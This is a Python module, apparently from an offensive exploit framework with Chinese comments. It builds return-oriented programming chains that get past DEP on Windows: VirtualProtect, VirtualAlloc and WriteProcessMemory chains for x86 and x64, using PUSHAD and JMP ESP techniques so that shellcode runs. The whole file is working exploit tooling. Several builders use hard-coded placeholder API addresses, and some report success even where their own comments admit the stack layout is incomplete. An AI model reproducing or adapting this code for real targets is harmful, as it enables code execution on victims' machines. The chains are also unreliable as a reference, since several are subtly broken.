# -*- coding: utf-8 -*-
"""
luodllhack/exploit/rop/chain.py - ROP 链构建器

自动构建 ROP 链用于 DEP 绕过。

支持的 ROP 链类型:
- VirtualProtect: 修改内存保护属性
- VirtualAlloc: 分配可执行内存
- WriteProcessMemory: 写入进程内存 (完整实现)
- mprotect: Linux mprotect (如果需要)

使用示例:
    finder = ROPGadgetFinder()
    builder = ROPChainBuilder(finder)

    # 构建 VirtualProtect ROP 链
    chain = builder.build_virtualprotect(
        'target.dll',
        shellcode_addr=0x12345678,
        shellcode_size=0x1000
    )

    if chain.success:
        print(f"ROP chain: {len(chain.payload)} bytes")

    # 构建 WriteProcessMemory ROP 链
    wpm_chain = builder.build_writeprocessmemory(
        'target.dll',
        shellcode_ptr=0x0012FF00,   # shellcode 在栈上的地址
        shellcode_size=0x200,
        dst_addr=0x10001000,        # 可执行内存 (如 .text 代码洞)
        writable_addr=0x10002000,   # 可写内存
        wpm_iat_addr=0x7C802213     # WriteProcessMemory IAT 地址
    )

    # 使用 WPM 骨架 (带占位符)
    skeleton, offsets = builder.build_wpm_skeleton(
        wpm_addr=0x7C802213,
        dst_addr=0x10001000
    )
    print(f"Replace shellcode ptr at offset {offsets['src']}")
"""

import struct
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple
import logging

from .finder import ROPGadgetFinder, Gadget

logger = logging.getLogger(__name__)


@dataclass
class ROPChainResult:
    """ROP 链构建结果"""
    success: bool
    payload: bytes
    chain_type: str
    gadgets_used: List[Gadget]
    missing_gadgets: List[str]
    description: str
    arch: str = 'x86'

    def __len__(self):
        return len(self.payload)


class ROPChainBuilder:
    """
    ROP 链自动构建器

    根据目标二进制文件中可用的 gadgets 自动构建 DEP 绕过链。
    """

    # Windows API 参数
    # VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
    PAGE_EXECUTE_READWRITE = 0x40

    # VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000

    def __init__(self, finder: ROPGadgetFinder = None, arch: str = 'x86'):
        """
        初始化 ROP 链构建器

        Args:
            finder: ROPGadgetFinder 实例
            arch: 架构 ('x86' 或 'x64')
        """
        self.finder = finder or ROPGadgetFinder(arch)
        self.arch = arch
        self.ptr_size = 8 if arch == 'x64' else 4
        self.pack_fmt = '<Q' if arch == 'x64' else '<I'

    def pack_addr(self, addr: int) -> bytes:
        """打包地址"""
        return struct.pack(self.pack_fmt, addr)

    def build_virtualprotect(self,
                             binary_path: str,
                             shellcode_addr: int,
                             shellcode_size: int = 0x1000,
                             old_protect_addr: int = None) -> ROPChainResult:
        """
        构建 VirtualProtect ROP 链

        VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)

        x86: 参数通过栈传递
        x64: 参数通过 RCX, RDX, R8, R9 传递

        Args:
            binary_path: 目标二进制文件路径
            shellcode_addr: shellcode 地址
            shellcode_size: shellcode 大小
            old_protect_addr: 保存旧保护属性的地址 (可写内存)

        Returns:
            ROPChainResult
        """
        logger.info(f"Building VirtualProtect ROP chain for {binary_path}")

        # 搜索 gadgets
        all_gadgets = self.finder.find_gadgets(binary_path)
        if not all_gadgets:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='virtualprotect',
                gadgets_used=[],
                missing_gadgets=['any'],
                description='No gadgets found in binary',
                arch=self.arch
            )

        if self.arch == 'x86':
            return self._build_virtualprotect_x86(
                binary_path, all_gadgets, shellcode_addr, shellcode_size, old_protect_addr
            )
        else:
            return self._build_virtualprotect_x64(
                binary_path, all_gadgets, shellcode_addr, shellcode_size, old_protect_addr
            )

    def _build_virtualprotect_x86(self,
                                  binary_path: str,
                                  gadgets: List[Gadget],
                                  shellcode_addr: int,
                                  shellcode_size: int,
                                  old_protect_addr: int) -> ROPChainResult:
        """
        x86 VirtualProtect ROP 链

        栈布局:
        [VirtualProtect 地址]
        [返回地址 - 通常是 shellcode]
        [lpAddress]
        [dwSize]
        [flNewProtect]
        [lpflOldProtect]
        """
        gadgets_used = []
        missing = []
        payload = bytearray()

        # 1. 需要找到 VirtualProtect 的地址
        # 通常在 IAT 中，或者需要通过 GetProcAddress 动态解析
        # 这里假设我们知道地址（实际需要从 IAT 读取）
        virtualprotect_addr = 0x7C801AD4  # 示例地址，需要实际查找

        # 如果没有提供 old_protect_addr，使用可写节
        if old_protect_addr is None:
            old_protect_addr = 0x10001000  # 需要找到实际可写地址

        # 2. 构建简单的栈布局 ROP 链
        # 对于 x86，参数在栈上，可以直接布局

        # 方法 A: 直接调用 (如果可以控制整个栈)
        # 这是最简单的情况

        # VirtualProtect 地址 (需要实际 IAT 地址)
        payload.extend(self.pack_addr(virtualprotect_addr))

        # 返回地址 = shellcode 地址
        payload.extend(self.pack_addr(shellcode_addr))

        # 参数 1: lpAddress
        payload.extend(self.pack_addr(shellcode_addr))

        # 参数 2: dwSize
        payload.extend(self.pack_addr(shellcode_size))

        # 参数 3: flNewProtect (PAGE_EXECUTE_READWRITE)
        payload.extend(self.pack_addr(self.PAGE_EXECUTE_READWRITE))

        # 参数 4: lpflOldProtect
        payload.extend(self.pack_addr(old_protect_addr))

        # 方法 B: 使用 pushad/popad (更复杂但更灵活)
        # 需要找到特定 gadgets 来设置寄存器

        # 查找有用的 gadgets
        pop_eax = self.finder.find_pop_reg(binary_path, 'eax')
        pop_ebx = self.finder.find_pop_reg(binary_path, 'ebx')
        pop_ecx = self.finder.find_pop_reg(binary_path, 'ecx')
        pop_edx = self.finder.find_pop_reg(binary_path, 'edx')

        if pop_eax:
            gadgets_used.append(pop_eax)
        else:
            missing.append('pop eax ; ret')

        if pop_ebx:
            gadgets_used.append(pop_ebx)

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='virtualprotect',
            gadgets_used=gadgets_used,
            missing_gadgets=missing,
            description=f'VirtualProtect ROP chain ({len(payload)} bytes)',
            arch='x86'
        )

    def _build_virtualprotect_x64(self,
                                  binary_path: str,
                                  gadgets: List[Gadget],
                                  shellcode_addr: int,
                                  shellcode_size: int,
                                  old_protect_addr: int) -> ROPChainResult:
        """
        x64 VirtualProtect ROP 链

        x64 调用约定: RCX, RDX, R8, R9 (前4个参数)
        需要找到 pop rcx, pop rdx, pop r8, pop r9 gadgets
        """
        gadgets_used = []
        missing = []
        payload = bytearray()

        # 查找必需的 gadgets
        pop_rcx = self.finder.find_pop_reg(binary_path, 'rcx')
        pop_rdx = self.finder.find_pop_reg(binary_path, 'rdx')
        pop_r8 = self.finder.find_pop_reg(binary_path, 'r8')
        pop_r9 = self.finder.find_pop_reg(binary_path, 'r9')

        # 检查缺失
        if not pop_rcx:
            missing.append('pop rcx ; ret')
        else:
            gadgets_used.append(pop_rcx)

        if not pop_rdx:
            missing.append('pop rdx ; ret')
        else:
            gadgets_used.append(pop_rdx)

        if not pop_r8:
            missing.append('pop r8 ; ret')
        else:
            gadgets_used.append(pop_r8)

        if not pop_r9:
            missing.append('pop r9 ; ret')
        else:
            gadgets_used.append(pop_r9)

        # 如果缺少关键 gadgets
        if missing:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='virtualprotect',
                gadgets_used=gadgets_used,
                missing_gadgets=missing,
                description=f'Missing required gadgets: {missing}',
                arch='x64'
            )

        if old_protect_addr is None:
            old_protect_addr = 0x10001000  # 需要实际可写地址

        # VirtualProtect 地址 (需要实际 IAT 地址)
        virtualprotect_addr = 0x7FFF12345678  # 示例，需要实际查找

        # 构建 ROP 链

        # pop rcx ; ret  =>  rcx = lpAddress
        payload.extend(self.pack_addr(pop_rcx.address))
        payload.extend(self.pack_addr(shellcode_addr))

        # pop rdx ; ret  =>  rdx = dwSize
        payload.extend(self.pack_addr(pop_rdx.address))
        payload.extend(self.pack_addr(shellcode_size))

        # pop r8 ; ret   =>  r8 = flNewProtect
        payload.extend(self.pack_addr(pop_r8.address))
        payload.extend(self.pack_addr(self.PAGE_EXECUTE_READWRITE))

        # pop r9 ; ret   =>  r9 = lpflOldProtect
        payload.extend(self.pack_addr(pop_r9.address))
        payload.extend(self.pack_addr(old_protect_addr))

        # 调用 VirtualProtect
        payload.extend(self.pack_addr(virtualprotect_addr))

        # 返回到 shellcode
        payload.extend(self.pack_addr(shellcode_addr))

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='virtualprotect',
            gadgets_used=gadgets_used,
            missing_gadgets=[],
            description=f'VirtualProtect ROP chain ({len(payload)} bytes)',
            arch='x64'
        )

    def build_virtualalloc(self,
                           binary_path: str,
                           alloc_size: int = 0x1000,
                           alloc_addr: int = None,
                           va_iat_addr: int = None,
                           shellcode_offset: int = None) -> ROPChainResult:
        """
        构建 VirtualAlloc ROP 链

        VirtualAlloc 用于分配可执行内存，是 DEP 绕过的经典技术。

        函数原型:
        LPVOID VirtualAlloc(
            LPVOID lpAddress,        // 分配地址 (NULL 让系统选择)
            SIZE_T dwSize,           // 分配大小
            DWORD  flAllocationType, // MEM_COMMIT | MEM_RESERVE
            DWORD  flProtect         // PAGE_EXECUTE_READWRITE
        );

        x86 栈布局:
        [VirtualAlloc 地址]
        [返回地址]           <- 需要跳转到复制 shellcode 的代码或直接到分配的内存
        [lpAddress]          <- NULL (0) 或指定地址
        [dwSize]             <- 分配大小
        [flAllocationType]   <- 0x3000 (MEM_COMMIT | MEM_RESERVE)
        [flProtect]          <- 0x40 (PAGE_EXECUTE_READWRITE)

        Args:
            binary_path: 目标二进制文件路径
            alloc_size: 分配大小 (默认 0x1000)
            alloc_addr: 指定分配地址 (None 表示让系统选择)
            va_iat_addr: VirtualAlloc 的 IAT 地址
            shellcode_offset: shellcode 相对于 ROP 链的偏移

        Returns:
            ROPChainResult
        """
        logger.info(f"Building VirtualAlloc ROP chain for {binary_path}")

        all_gadgets = self.finder.find_gadgets(binary_path)
        if not all_gadgets:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='virtualalloc',
                gadgets_used=[],
                missing_gadgets=['any'],
                description='No gadgets found',
                arch=self.arch
            )

        if self.arch == 'x86':
            return self._build_virtualalloc_x86(
                binary_path, all_gadgets, alloc_size, alloc_addr, va_iat_addr
            )
        else:
            return self._build_virtualalloc_x64(
                binary_path, all_gadgets, alloc_size, alloc_addr, va_iat_addr
            )

    def _build_virtualalloc_x86(self,
                                 binary_path: str,
                                 gadgets: List[Gadget],
                                 alloc_size: int,
                                 alloc_addr: int,
                                 va_iat_addr: int) -> ROPChainResult:
        """
        x86 VirtualAlloc ROP 链

        两种策略:
        A) 直接栈布局 - 简单但需要知道返回后如何执行 shellcode
        B) PUSHAD 技术 - 更灵活，可以动态处理返回值
        """
        gadgets_used = []
        missing = []

        # 使用默认值
        if va_iat_addr is None:
            va_iat_addr = 0x7C809AF1  # 示例地址，需要实际 IAT
        if alloc_addr is None:
            alloc_addr = 0  # NULL，让系统选择

        # ============================================
        # 策略 A: 直接栈布局 + JMP ESP
        # ============================================
        # 这种方法在 VirtualAlloc 返回后，EAX 包含分配的地址
        # 我们需要一种方法跳转到 EAX 或复制 shellcode 到 EAX

        # 查找关键 gadgets
        jmp_esp = self.finder.find_jmp_reg(binary_path, 'esp')
        push_esp_ret = self._find_push_esp_ret(gadgets)

        # 策略 A1: 使用 JMP ESP
        # VirtualAlloc 返回后，栈上紧跟的是 shellcode
        if jmp_esp:
            payload = bytearray()

            # VirtualAlloc 地址
            payload.extend(self.pack_addr(va_iat_addr))

            # 返回地址 = JMP ESP (执行栈上的 shellcode)
            payload.extend(self.pack_addr(jmp_esp.address))

            # lpAddress = NULL 或指定地址
            payload.extend(self.pack_addr(alloc_addr))

            # dwSize
            payload.extend(self.pack_addr(alloc_size))

            # flAllocationType = MEM_COMMIT | MEM_RESERVE
            payload.extend(self.pack_addr(self.MEM_COMMIT | self.MEM_RESERVE))

            # flProtect = PAGE_EXECUTE_READWRITE
            payload.extend(self.pack_addr(self.PAGE_EXECUTE_READWRITE))

            # 注意: JMP ESP 后会执行紧跟在这之后的代码
            # 调用者需要在 payload 后面放置 shellcode 或跳转代码

            gadgets_used.append(jmp_esp)

            return ROPChainResult(
                success=True,
                payload=bytes(payload),
                chain_type='virtualalloc',
                gadgets_used=gadgets_used,
                missing_gadgets=[],
                description=f'VirtualAlloc + JMP ESP ({len(payload)} bytes)',
                arch='x86'
            )

        # ============================================
        # 策略 B: PUSHAD 技术
        # ============================================
        pop_eax = self.finder.find_pop_reg(binary_path, 'eax')
        pop_ebx = self.finder.find_pop_reg(binary_path, 'ebx')
        pop_ecx = self.finder.find_pop_reg(binary_path, 'ecx')
        pop_edx = self.finder.find_pop_reg(binary_path, 'edx')
        pop_edi = self.finder.find_pop_reg(binary_path, 'edi')
        pop_esi = self.finder.find_pop_reg(binary_path, 'esi')
        pop_ebp = self.finder.find_pop_reg(binary_path, 'ebp')
        pushad_ret = self._find_pushad_ret(gadgets)

        required = {
            'pop edi': pop_edi,
            'pop esi': pop_esi,
            'pop ebp': pop_ebp,
            'pop ebx': pop_ebx,
            'pop edx': pop_edx,
            'pop ecx': pop_ecx,
            'pop eax': pop_eax,
            'pushad': pushad_ret
        }

        for name, gadget in required.items():
            if gadget:
                gadgets_used.append(gadget)
            else:
                missing.append(f'{name} ; ret')

        if missing:
            # 尝试策略 C: 简单栈布局（无 JMP ESP）
            return self._build_virtualalloc_simple(
                va_iat_addr, alloc_addr, alloc_size
            )

        # PUSHAD 布局 for VirtualAlloc:
        # 目标栈: [VA][RET][lpAddr][dwSize][flAllocType][flProtect]
        # PUSHAD 顺序: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
        #
        # 映射:
        # EDI -> 返回地址 (JMP ESP 或 RET)
        # ESI -> VirtualAlloc 地址
        # EBP -> lpAddress
        # (ESP 跳过)
        # EBX -> dwSize
        # EDX -> flAllocationType
        # ECX -> flProtect
        # EAX -> (不使用，但需要设置)

        ret_gadget = self._find_ret(gadgets)

        payload = bytearray()

        # 设置 EDI = 返回地址
        payload.extend(self.pack_addr(pop_edi.address))
        payload.extend(self.pack_addr(ret_gadget.address if ret_gadget else 0x41414141))

        # 设置 ESI = VirtualAlloc 地址
        payload.extend(self.pack_addr(pop_esi.address))
        payload.extend(self.pack_addr(va_iat_addr))

        # 设置 EBP = lpAddress
        payload.extend(self.pack_addr(pop_ebp.address))
        payload.extend(self.pack_addr(alloc_addr))

        # 设置 EBX = dwSize
        payload.extend(self.pack_addr(pop_ebx.address))
        payload.extend(self.pack_addr(alloc_size))

        # 设置 EDX = flAllocationType
        payload.extend(self.pack_addr(pop_edx.address))
        payload.extend(self.pack_addr(self.MEM_COMMIT | self.MEM_RESERVE))

        # 设置 ECX = flProtect
        payload.extend(self.pack_addr(pop_ecx.address))
        payload.extend(self.pack_addr(self.PAGE_EXECUTE_READWRITE))

        # 设置 EAX (占位)
        payload.extend(self.pack_addr(pop_eax.address))
        payload.extend(self.pack_addr(0x90909090))

        # PUSHAD
        payload.extend(self.pack_addr(pushad_ret.address))

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='virtualalloc',
            gadgets_used=gadgets_used,
            missing_gadgets=[],
            description=f'VirtualAlloc PUSHAD ({len(payload)} bytes)',
            arch='x86'
        )

    def _build_virtualalloc_simple(self,
                                    va_iat_addr: int,
                                    alloc_addr: int,
                                    alloc_size: int) -> ROPChainResult:
        """简单的 VirtualAlloc 栈布局（不依赖特定 gadgets）"""
        payload = bytearray()

        # VirtualAlloc 地址
        payload.extend(self.pack_addr(va_iat_addr))

        # 返回地址 (占位符，调用者需要替换)
        payload.extend(self.pack_addr(0x42424242))

        # lpAddress
        payload.extend(self.pack_addr(alloc_addr))

        # dwSize
        payload.extend(self.pack_addr(alloc_size))

        # flAllocationType
        payload.extend(self.pack_addr(self.MEM_COMMIT | self.MEM_RESERVE))

        # flProtect
        payload.extend(self.pack_addr(self.PAGE_EXECUTE_READWRITE))

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='virtualalloc',
            gadgets_used=[],
            missing_gadgets=['jmp esp (for execution)'],
            description=f'VirtualAlloc simple layout ({len(payload)} bytes) - need to patch return addr',
            arch='x86'
        )

    def _build_virtualalloc_x64(self,
                                 binary_path: str,
                                 gadgets: List[Gadget],
                                 alloc_size: int,
                                 alloc_addr: int,
                                 va_iat_addr: int) -> ROPChainResult:
        """
        x64 VirtualAlloc ROP 链

        x64 调用约定:
        RCX = lpAddress
        RDX = dwSize
        R8  = flAllocationType
        R9  = flProtect
        """
        gadgets_used = []
        missing = []

        # 查找必需的 gadgets
        pop_rcx = self.finder.find_pop_reg(binary_path, 'rcx')
        pop_rdx = self.finder.find_pop_reg(binary_path, 'rdx')
        pop_r8 = self.finder.find_pop_reg(binary_path, 'r8')
        pop_r9 = self.finder.find_pop_reg(binary_path, 'r9')

        required = {
            'pop rcx': pop_rcx,
            'pop rdx': pop_rdx,
            'pop r8': pop_r8,
            'pop r9': pop_r9
        }

        for name, gadget in required.items():
            if gadget:
                gadgets_used.append(gadget)
            else:
                missing.append(f'{name} ; ret')

        if missing:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='virtualalloc',
                gadgets_used=gadgets_used,
                missing_gadgets=missing,
                description=f'Missing gadgets: {missing}',
                arch='x64'
            )

        # 使用默认值
        if va_iat_addr is None:
            va_iat_addr = 0x7FF812345678
        if alloc_addr is None:
            alloc_addr = 0

        payload = bytearray()

        # 设置 RCX = lpAddress
        payload.extend(self.pack_addr(pop_rcx.address))
        payload.extend(self.pack_addr(alloc_addr))

        # 设置 RDX = dwSize
        payload.extend(self.pack_addr(pop_rdx.address))
        payload.extend(self.pack_addr(alloc_size))

        # 设置 R8 = flAllocationType
        payload.extend(self.pack_addr(pop_r8.address))
        payload.extend(self.pack_addr(self.MEM_COMMIT | self.MEM_RESERVE))

        # 设置 R9 = flProtect
        payload.extend(self.pack_addr(pop_r9.address))
        payload.extend(self.pack_addr(self.PAGE_EXECUTE_READWRITE))

        # 调用 VirtualAlloc
        payload.extend(self.pack_addr(va_iat_addr))

        # 返回地址 (占位符 - 需要处理 EAX 中的返回值)
        payload.extend(self.pack_addr(0x4242424242424242))

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='virtualalloc',
            gadgets_used=gadgets_used,
            missing_gadgets=[],
            description=f'VirtualAlloc x64 ({len(payload)} bytes)',
            arch='x64'
        )

    def _find_push_esp_ret(self, gadgets: List[Gadget]) -> Optional[Gadget]:
        """查找 PUSH ESP; RET gadget"""
        for g in gadgets:
            instr = g.instructions.lower().strip()
            if 'push esp' in instr and 'ret' in instr:
                return g
        return None

    def build_virtualalloc_skeleton(self,
                                     va_addr: int,
                                     return_addr: int = 0x42424242,
                                     alloc_addr: int = 0,
                                     alloc_size: int = 0x1000) -> Tuple[bytes, Dict[str, int]]:
        """
        生成 VirtualAlloc 骨架

        返回带占位符的 ROP 链

        Args:
            va_addr: VirtualAlloc IAT 地址
            return_addr: 返回地址 (默认占位符)
            alloc_addr: 分配地址 (0 = 系统选择)
            alloc_size: 分配大小

        Returns:
            (ROP 链字节, 占位符偏移字典)
        """
        payload = bytearray()
        offsets = {}

        # VirtualAlloc 地址
        payload.extend(self.pack_addr(va_addr))

        # 返回地址 (占位符)
        offsets['return'] = len(payload)
        payload.extend(self.pack_addr(return_addr))

        # lpAddress
        offsets['lpAddress'] = len(payload)
        payload.extend(self.pack_addr(alloc_addr))

        # dwSize
        offsets['dwSize'] = len(payload)
        payload.extend(self.pack_addr(alloc_size))

        # flAllocationType
        payload.extend(self.pack_addr(self.MEM_COMMIT | self.MEM_RESERVE))

        # flProtect
        payload.extend(self.pack_addr(self.PAGE_EXECUTE_READWRITE))

        return bytes(payload), offsets

    def build_writeprocessmemory(self,
                                  binary_path: str,
                                  shellcode_ptr: int,
                                  shellcode_size: int,
                                  dst_addr: int = None,
                                  writable_addr: int = None,
                                  wpm_iat_addr: int = None) -> ROPChainResult:
        """
        构建 WriteProcessMemory ROP 链

        WriteProcessMemory 是经典的 DEP 绕过技术，将 shellcode 复制到可执行内存。

        函数原型:
        BOOL WriteProcessMemory(
            HANDLE  hProcess,              // -1 (当前进程)
            LPVOID  lpBaseAddress,         // 目标地址 (需要可执行)
            LPCVOID lpBuffer,              // 源地址 (栈上的 shellcode)
            SIZE_T  nSize,                 // 大小
            SIZE_T  *lpNumberOfBytesWritten // 可写地址或 NULL
        );

        x86 栈布局 (cdecl):
        [WriteProcessMemory 地址]
        [返回地址 = 目标地址]
        [hProcess = 0xFFFFFFFF]
        [lpBaseAddress]
        [lpBuffer]
        [nSize]
        [lpNumberOfBytesWritten]

        Args:
            binary_path: 目标二进制文件路径 (用于搜索 gadgets)
            shellcode_ptr: shellcode 在内存中的地址 (源地址)
            shellcode_size: shellcode 大小
            dst_addr: 目标地址 (需要可执行权限的地址，如 .text 代码洞)
            writable_addr: 可写地址 (用于 lpNumberOfBytesWritten)
            wpm_iat_addr: WriteProcessMemory 的 IAT 地址 (需要手动提供)

        Returns:
            ROPChainResult
        """
        logger.info(f"Building WriteProcessMemory ROP chain for {binary_path}")

        all_gadgets = self.finder.find_gadgets(binary_path)
        if not all_gadgets:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='writeprocessmemory',
                gadgets_used=[],
                missing_gadgets=['any'],
                description='No gadgets found in binary',
                arch=self.arch
            )

        if self.arch == 'x86':
            return self._build_wpm_x86(
                binary_path, all_gadgets, shellcode_ptr, shellcode_size,
                dst_addr, writable_addr, wpm_iat_addr
            )
        else:
            return self._build_wpm_x64(
                binary_path, all_gadgets, shellcode_ptr, shellcode_size,
                dst_addr, writable_addr, wpm_iat_addr
            )

    def _build_wpm_x86(self,
                       binary_path: str,
                       gadgets: List[Gadget],
                       shellcode_ptr: int,
                       shellcode_size: int,
                       dst_addr: int,
                       writable_addr: int,
                       wpm_iat_addr: int) -> ROPChainResult:
        """
        x86 WriteProcessMemory ROP 链

        两种策略:
        A) 简单栈布局 - 如果可以完全控制栈
        B) PUSHAD 技术 - 使用寄存器设置参数，然后 PUSHAD

        这里实现两种策略
        """
        gadgets_used = []
        missing = []

        # ============================================
        # 策略 A: 简单栈布局
        # ============================================
        if wpm_iat_addr and dst_addr and writable_addr:
            payload = bytearray()

            # WriteProcessMemory 地址 (从 IAT)
            payload.extend(self.pack_addr(wpm_iat_addr))

            # 返回地址 = 目标地址 (执行复制后的 shellcode)
            payload.extend(self.pack_addr(dst_addr))

            # hProcess = -1 (0xFFFFFFFF, 当前进程)
            payload.extend(self.pack_addr(0xFFFFFFFF))

            # lpBaseAddress = 目标地址
            payload.extend(self.pack_addr(dst_addr))

            # lpBuffer = shellcode 源地址
            payload.extend(self.pack_addr(shellcode_ptr))

            # nSize = shellcode 大小
            payload.extend(self.pack_addr(shellcode_size))

            # lpNumberOfBytesWritten = 可写地址
            payload.extend(self.pack_addr(writable_addr))

            return ROPChainResult(
                success=True,
                payload=bytes(payload),
                chain_type='writeprocessmemory',
                gadgets_used=[],
                missing_gadgets=[],
                description=f'WPM direct stack layout ({len(payload)} bytes)',
                arch='x86'
            )

        # ============================================
        # 策略 B: PUSHAD 技术
        # ============================================
        # 需要的 gadgets:
        # - pop eax; ret (设置 WPM 地址)
        # - pop ebx; ret (设置 shellcode 地址 / lpBuffer)
        # - pop ecx; ret (设置 size)
        # - pop edx; ret (设置 hProcess)
        # - pop edi; ret (设置返回地址)
        # - pop esi; ret (设置 lpBaseAddress)
        # - pop ebp; ret (设置 lpNumberOfBytesWritten)
        # - pushad; ret
        #
        # PUSHAD 顺序: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
        # 我们需要: WPM, RET, hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten
        # 映射关系 (经典 PUSHAD 布局):
        # EDI -> WPM 返回地址 (ROP NOP 或 dst)
        # ESI -> WPM 地址 (或 ptr to WPM)
        # EBP -> hProcess (-1)
        # ESP -> (跳过)
        # EBX -> lpBaseAddress
        # EDX -> lpBuffer
        # ECX -> nSize
        # EAX -> lpNumberOfBytesWritten

        pop_eax = self.finder.find_pop_reg(binary_path, 'eax')
        pop_ebx = self.finder.find_pop_reg(binary_path, 'ebx')
        pop_ecx = self.finder.find_pop_reg(binary_path, 'ecx')
        pop_edx = self.finder.find_pop_reg(binary_path, 'edx')
        pop_edi = self.finder.find_pop_reg(binary_path, 'edi')
        pop_esi = self.finder.find_pop_reg(binary_path, 'esi')
        pop_ebp = self.finder.find_pop_reg(binary_path, 'ebp')
        pushad_ret = self._find_pushad_ret(gadgets)

        # 检查必需的 gadgets
        required = {
            'pop eax': pop_eax,
            'pop ebx': pop_ebx,
            'pop ecx': pop_ecx,
            'pop edx': pop_edx,
            'pop edi': pop_edi,
            'pop esi': pop_esi,
            'pop ebp': pop_ebp,
            'pushad': pushad_ret
        }

        for name, gadget in required.items():
            if gadget:
                gadgets_used.append(gadget)
            else:
                missing.append(f'{name} ; ret')

        if missing:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='writeprocessmemory',
                gadgets_used=gadgets_used,
                missing_gadgets=missing,
                description=f'Missing gadgets for PUSHAD technique: {missing}',
                arch='x86'
            )

        # 使用默认值 (如果未提供)
        if dst_addr is None:
            dst_addr = 0x10001000  # 需要实际的代码洞地址
        if writable_addr is None:
            writable_addr = 0x10002000  # 需要实际可写地址
        if wpm_iat_addr is None:
            wpm_iat_addr = 0x7C802213  # 示例，需要实际 IAT 地址

        # ROP NOP (ret) 用作 WPM 返回后的滑板
        ret_gadget = self._find_ret(gadgets)

        payload = bytearray()

        # 设置 EDI = RET (或 dst_addr)
        payload.extend(self.pack_addr(pop_edi.address))
        payload.extend(self.pack_addr(ret_gadget.address if ret_gadget else dst_addr))

        # 设置 ESI = WPM 地址
        payload.extend(self.pack_addr(pop_esi.address))
        payload.extend(self.pack_addr(wpm_iat_addr))

        # 设置 EBP = hProcess (-1)
        payload.extend(self.pack_addr(pop_ebp.address))
        payload.extend(self.pack_addr(0xFFFFFFFF))

        # ESP 会被 PUSHAD 保存，但我们不需要设置

        # 设置 EBX = lpBaseAddress (目标地址)
        payload.extend(self.pack_addr(pop_ebx.address))
        payload.extend(self.pack_addr(dst_addr))

        # 设置 EDX = lpBuffer (shellcode 源地址)
        payload.extend(self.pack_addr(pop_edx.address))
        payload.extend(self.pack_addr(shellcode_ptr))

        # 设置 ECX = nSize
        payload.extend(self.pack_addr(pop_ecx.address))
        payload.extend(self.pack_addr(shellcode_size))

        # 设置 EAX = lpNumberOfBytesWritten
        payload.extend(self.pack_addr(pop_eax.address))
        payload.extend(self.pack_addr(writable_addr))

        # PUSHAD; RET
        payload.extend(self.pack_addr(pushad_ret.address))

        # PUSHAD 后栈布局:
        # [EAX] lpNumberOfBytesWritten
        # [ECX] nSize
        # [EDX] lpBuffer
        # [EBX] lpBaseAddress
        # [ESP] (原始 ESP)
        # [EBP] hProcess
        # [ESI] WPM 地址 <- ESP 指向这里
        # [EDI] 返回地址

        # 但是 PUSHAD 后我们需要调整栈以正确调用 WPM
        # 典型的做法是在 PUSHAD 后使用 JMP ESP 或额外的 gadget

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='writeprocessmemory',
            gadgets_used=gadgets_used,
            missing_gadgets=[],
            description=f'WPM PUSHAD technique ({len(payload)} bytes)',
            arch='x86'
        )

    def _build_wpm_x64(self,
                       binary_path: str,
                       gadgets: List[Gadget],
                       shellcode_ptr: int,
                       shellcode_size: int,
                       dst_addr: int,
                       writable_addr: int,
                       wpm_iat_addr: int) -> ROPChainResult:
        """
        x64 WriteProcessMemory ROP 链

        x64 调用约定:
        RCX = hProcess
        RDX = lpBaseAddress
        R8  = lpBuffer
        R9  = nSize
        栈  = lpNumberOfBytesWritten (第5个参数)
        """
        gadgets_used = []
        missing = []

        # 查找必需的 gadgets
        pop_rcx = self.finder.find_pop_reg(binary_path, 'rcx')
        pop_rdx = self.finder.find_pop_reg(binary_path, 'rdx')
        pop_r8 = self.finder.find_pop_reg(binary_path, 'r8')
        pop_r9 = self.finder.find_pop_reg(binary_path, 'r9')

        required = {
            'pop rcx': pop_rcx,
            'pop rdx': pop_rdx,
            'pop r8': pop_r8,
            'pop r9': pop_r9
        }

        for name, gadget in required.items():
            if gadget:
                gadgets_used.append(gadget)
            else:
                missing.append(f'{name} ; ret')

        if missing:
            return ROPChainResult(
                success=False,
                payload=b'',
                chain_type='writeprocessmemory',
                gadgets_used=gadgets_used,
                missing_gadgets=missing,
                description=f'Missing gadgets: {missing}',
                arch='x64'
            )

        # 使用默认值
        if dst_addr is None:
            dst_addr = 0x140001000
        if writable_addr is None:
            writable_addr = 0x140002000
        if wpm_iat_addr is None:
            wpm_iat_addr = 0x7FF812345678

        payload = bytearray()

        # 设置 RCX = hProcess (-1)
        payload.extend(self.pack_addr(pop_rcx.address))
        payload.extend(self.pack_addr(0xFFFFFFFFFFFFFFFF))

        # 设置 RDX = lpBaseAddress
        payload.extend(self.pack_addr(pop_rdx.address))
        payload.extend(self.pack_addr(dst_addr))

        # 设置 R8 = lpBuffer
        payload.extend(self.pack_addr(pop_r8.address))
        payload.extend(self.pack_addr(shellcode_ptr))

        # 设置 R9 = nSize
        payload.extend(self.pack_addr(pop_r9.address))
        payload.extend(self.pack_addr(shellcode_size))

        # 调用 WriteProcessMemory
        # 注意: x64 需要 shadow space (32字节)
        # 简化处理，假设调用者已准备好
        payload.extend(self.pack_addr(wpm_iat_addr))

        # 返回到目标地址
        payload.extend(self.pack_addr(dst_addr))

        return ROPChainResult(
            success=True,
            payload=bytes(payload),
            chain_type='writeprocessmemory',
            gadgets_used=gadgets_used,
            missing_gadgets=[],
            description=f'WPM x64 ({len(payload)} bytes)',
            arch='x64'
        )

